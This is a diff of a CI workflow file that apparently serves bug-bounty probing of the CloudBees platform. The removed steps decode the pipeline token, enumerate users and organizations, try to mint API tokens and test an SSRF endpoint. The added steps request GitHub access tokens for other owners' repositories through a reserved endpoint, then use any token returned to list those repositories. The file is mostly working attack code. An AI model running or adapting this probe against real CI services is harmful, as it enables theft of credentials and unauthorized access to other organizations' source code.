@@ -5,25 +5,37 @@ name: probe11
 on:
   push:
     branches:
-      - "**"
+      - main
 
 permissions:
   scm-token-own: read
-  id-token: write
+  scm-token-org: read
 
 jobs:
   tok:
     steps:
-      - name: probe-token-scope
+      - name: scm-token-scope
         uses: docker://alpine:3.20
         env:
           CBTOK: ${{ cloudbees.api.token }}
           CBURL: ${{ cloudbees.api.url }}
+          ORGID: ${{ cloudbees.org.id }}
         run: |
-          apk add --no-cache curl >/dev/null 2>&1
-          echo "url=$CBURL tokenlen=${#CBTOK}"
-          echo "== payload"; echo "$CBTOK" | cut -d. -f2 | base64 -d 2>/dev/null | head -c 800; echo
-          echo "== orgs"; curl -s -m 10 -H "Authorization: Bearer $CBTOK" "$CBURL/v1/organizations" | head -c 300; echo
-          echo "== users"; curl -s -m 10 -H "Authorization: Bearer $CBTOK" "$CBURL/v1/users" | head -c 300; echo
-          echo "== api-tokens"; curl -s -m 10 -X POST -H "Authorization: Bearer $CBTOK" -H 'content-type: application/json' -d '{"name":"probe-pat"}' "$CBURL/v1/api-tokens" | head -c 300; echo
-          echo "== ssrf-as-token"; curl -s -m 10 -X POST -H "Authorization: Bearer $CBTOK" -H 'content-type: application/json' -d '{"resourceId":"9c7b76c3-bb23-4283-8f98-1bbf051dacf7","provider":"gitlab-server","url":"http://example.com","username":"u","password":"p"}' "$CBURL/v1/resources/9c7b76c3-bb23-4283-8f98-1bbf051dacf7/endpoints-check" | head -c 200; echo
+          apk add --no-cache curl jq >/dev/null 2>&1
+          probe() {
+            echo "--- repo: $1"
+            R=$(curl -s -w '\nHTTP:%{http_code}' -X POST -H "Authorization: Bearer $CBTOK" -H 'Content-Type: application/json' --data-raw "{\"scm_repo_url\": \"$1\"}" "$CBURL/reserved/v1/resources/$ORGID/scm-access-token")
+            echo "$R" | tail -1
+            B=$(echo "$R" | head -n -1)
+            TOK=$(echo "$B" | jq -r '.accessToken // empty' 2>/dev/null)
+            if [ -n "$TOK" ]; then
+              echo "TOKEN len=${#TOK} prefix=$(echo "$TOK" | cut -c1-6)"
+              curl -s -o /dev/null -w '  gh-installation-repos:%{http_code}\n' -H "Authorization: Bearer $TOK" https://api.github.com/installation/repositories
+              curl -s -H "Authorization: Bearer $TOK" https://api.github.com/installation/repositories | jq -r '.repositories[]?.full_name' 2>/dev/null | head -5
+            else
+              echo "  no token: $(echo "$B" | head -c 150)"
+            fi
+          }
+          probe "https://github.com/huntbugbounty/cb-unify-test"
+          probe "https://github.com/cloudbees-io/checkout"
+          probe "https://github.com/octocat/Hello-World"
